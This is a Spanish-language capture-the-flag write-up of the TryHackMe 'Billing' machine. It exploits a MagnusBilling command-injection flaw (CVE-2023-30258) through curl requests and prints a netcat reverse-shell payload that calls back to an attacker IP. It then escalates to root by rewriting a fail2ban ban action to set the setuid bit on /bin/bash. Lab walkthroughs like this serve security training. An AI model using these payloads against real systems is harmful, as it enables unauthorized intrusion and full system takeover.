---
title: Billing - TryHackMe
layout: post
permalink: /writeups/THM/billing
date: 2025-04-22 11:00:00 -0000
description: >
  Write up en español para Billing - TryHackMe
pin: false  
toc: true   
math: false 
mermaid: false 
---

## Escaneo de puertos

```bash
nmap -T4 -n -sC -sV -Pn -p- 10.10.20.37
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-21 23:38 CAT
Nmap scan report for 10.10.20.37
Host is up (0.054s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 79:ba:5d:23:35:b2:f0:25:d7:53:5e:c5:b9:af:c0:cc (RSA)
|   256 4e:c3:34:af:00:b7:35:bc:9f:f5:b0:d2:aa:35:ae:34 (ECDSA)
|_  256 26:aa:17:e0:c8:2a:c9:d9:98:17:e4:8f:87:73:78:4d (ED25519)
80/tcp   open  http     Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
| http-robots.txt: 1 disallowed entry
|_/mbilling/
| http-title:             MagnusBilling
|_Requested resource was http://10.10.20.37/mbilling/
3306/tcp open  mysql    MariaDB 10.3.23 or earlier (unauthorized)
5038/tcp open  asterisk Asterisk Call Manager 2.10.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- **22** (`SSH`)
- **80** (`HTTP`)
- **3306** (`MySQL`)
- **5038** (`Asterisk`)

## Servicio MagnusBilling

Dentro del directorio `/mbilling/` podemos encontrar un fichero llamado `README.md` que nos indica la verison de la aplicación.

![alt text](/assets/img/writeups/tryhackme/billing/image-7.pngimage.png)

Si buscamos vulnerabilidades en la aplicación podemos encontrar [CVE-2023-30258](https://nvd.nist.gov/vuln/detail/CVE-2023-30258). 
Esta vulnerabilidad nos permite ejecutar comandos mediante peticiones HTTP sin autenticación.

Según este [PoC](https://eldstal.se/advisories/230327-magnusbilling.html) haremos la siguiente petición.

Al revisar el [código vulnerable](https://github.com/magnussolution/magnusbilling7/blob/f6cd038161349895ff6f186405b9a89f564c9448/lib/icepay/icepay.php#L753) mencionado en el advisory, se aprecia que si se proporciona el parámetro GET `democ` (y su longitud supera los 5 caracteres) en una petición al endpoint `/lib/icepay/icepay.php`, se construye un comando así:

```php
"touch " . $_GET['democ'] . '.txt'
```

Esta cadena se pasa luego a la función `exec()`, lo que hace que el código sea vulnerable a inyección de comandos.

![alt text](/assets/img/writeups/tryhackme/billing/image-7.pngmagnusbilling_vulnerable_code.webp)

Al probar el PoC del advisory con comandos `sleep`, se confirma la vulnerabilidad, pues el servidor tarda sistemáticamente más del tiempo especificado en nuestras órdenes `sleep`, lo que indica que se están ejecutando.

```bash
time curl -s 'http://10.10.20.37/mbilling/lib/icepay/icepay.php?democ=;sleep+5;'
curl -s 'http://10.10.20.37/mbilling/lib/icepay/icepay.php?democ=;sleep+5;'  0.01s user 0.00s system 0% cpu 5.118 total

time curl -s 'http://10.10.20.37/mbilling/lib/icepay/icepay.php?democ=;sleep+3;'
curl -s 'http://10.10.20.37/mbilling/lib/icepay/icepay.php?democ=;sleep+3;'  0.00s user 0.00s system 0% cpu 3.118 total

```

Sabiendo que podemos ejecutar comandos podemos obtener una reverse shell.

```plaintext
;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.23.66.202 4444 >/tmp/f;'
```

Y la codificamos en URL.

![alt text](/assets/img/writeups/tryhackme/billing/image-7.pngimage-1.png)

## Shell con asterisk

![alt text](/assets/img/writeups/tryhackme/billing/image-7.pngimage-2.png)

### User flag

![alt text](/assets/img/writeups/tryhackme/billing/image-7.pngimage-3.png)

## Escalado de privilegios

Ejecutamos 

```bash
asterisk@Billing:/var/www/html/mbilling/lib/icepay$ sudo -l
Matching Defaults entries for asterisk on Billing:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on Billing:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```

Al verificar los privilegios de sudo del usuario asterisk, encontramos que dicho usuario tiene permitido ejecutar el comando fail2ban-client como root sin necesidad de contraseña.


**fail2ban-client** es una interfaz de línea de comandos que nos permite interactuar, configurar y controlar el **fail2ban-server**. A modo de resumen, fail2ban es una herramienta de seguridad que monitorea archivos de log en busca de actividades sospechosas (como múltiples intentos fallidos de inicio de sesión) y bloquea las IP ofensivas modificando reglas del firewall.

Verificando el estado del fail2ban-server, observamos que hay 8 jails activos:

![alt text](/assets/img/writeups/tryhackme/billing/image-7.pngimage-4.png)

Los jails son básicamente configuraciones que definen qué logs monitorear, los patrones a buscar y qué acciones tomar cuando se detectan esos patrones.

Al revisar el archivo /etc/fail2ban/jail.local, vemos un ejemplo de jail.

![alt text](/assets/img/writeups/tryhackme/billing/image-7.pngimage-5.png)

Esta configuración indica, entre otras cosas, que el jail **asterisk-iptables** monitorea el archivo `/var/log/asterisk/messages` y busca patrones definidos en el filtro asterisk (/etc/fail2ban/filter.d/asterisk.conf). Cuando se detectan coincidencias, ejecuta la acción definida en **iptables-allports** (/etc/fail2ban/action.d/iptables-allports.conf).

Para usar fail2ban para ejecutar comandos como **root**, podemos modificar una de las acciones definidas para un jail, como la acción que se realiza al banear una IP (actionban).

Primero, consultamos las acciones activas del jail **asterisk-iptables** y luego, modificamos la acción actionban de **iptables-allports-ASTERISK** para ejecutar un comando arbitrario, en este caso, establecer el bit setuid en **/bin/bash**.

![alt text](/assets/img/writeups/tryhackme/billing/image-7.pngimage-6.png)

Ahora, al banear manualmente una IP en el jail **asterisk-iptables**, se ejecutará el comando `chmod +s /bin/bash` como root.

Finalmente, con el bit setuid activado en /bin/bash, podemos usarlo para obtener una shell con privilegios de root

![alt text](/assets/img/writeups/tryhackme/billing/image-7.png)